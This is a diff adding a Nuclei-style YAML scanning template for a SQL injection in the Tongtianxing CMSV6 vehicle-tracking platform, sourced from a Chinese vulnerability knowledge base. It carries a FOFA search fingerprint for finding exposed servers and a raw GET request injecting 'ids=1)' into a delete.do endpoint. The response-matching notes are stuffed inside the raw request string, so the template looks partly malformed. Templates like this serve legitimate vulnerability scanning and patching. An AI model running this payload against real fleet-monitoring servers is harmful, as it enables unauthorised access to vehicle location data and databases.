@@ -1,0 +1,40 @@
+id: poc-dg9rb42n2903dkgy
+info:
+  name: 通天星CMSV6车载定位监控平台SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dg9rb42n2903dkgy'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dg9rb42n2903dkgy
+    fofa: body="/808gps/"
+http:
+- raw:
+  - 'GET /run_stop/delete.do;downloadLogger.action?ids=1)&loadAll=1 HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?result)(?=.*?10001).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
